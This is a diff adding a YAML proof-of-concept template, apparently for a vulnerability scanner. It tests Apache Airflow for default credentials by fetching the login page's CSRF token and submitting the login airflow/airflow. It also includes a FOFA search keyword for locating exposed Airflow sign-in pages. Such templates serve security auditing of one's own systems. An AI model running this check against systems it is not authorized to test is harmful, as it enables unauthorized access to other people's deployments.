@@ -1,0 +1,29 @@
+name: poc-yaml-Apache-Airflow-Default-Login
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /login/
+        expression: response.status == 200
+        output:
+            search: '"<input id=\"csrf_token\" name=\"csrf_token\" type=\"hidden\" value=\"(?P<token>.+?)\"".bsubmatch(response.body)'
+            token: search["token"]
+    r1:
+        request:
+            cache: true
+            method: POST
+            path: /login/
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: |
+                username=airflow&password=airflow&_csrf_token={{token}}
+        expression: response.status == 302 && response.body.bcontains(b"You should be redirected automatically to target URL") && response.body.bcontains(b"Redirecting")
+expression: r0() && r1()
+detail:
+    author: cysec
+    links:
+        - http://cysec.com
+    fofakeyword: title="Sign In - Airflow"
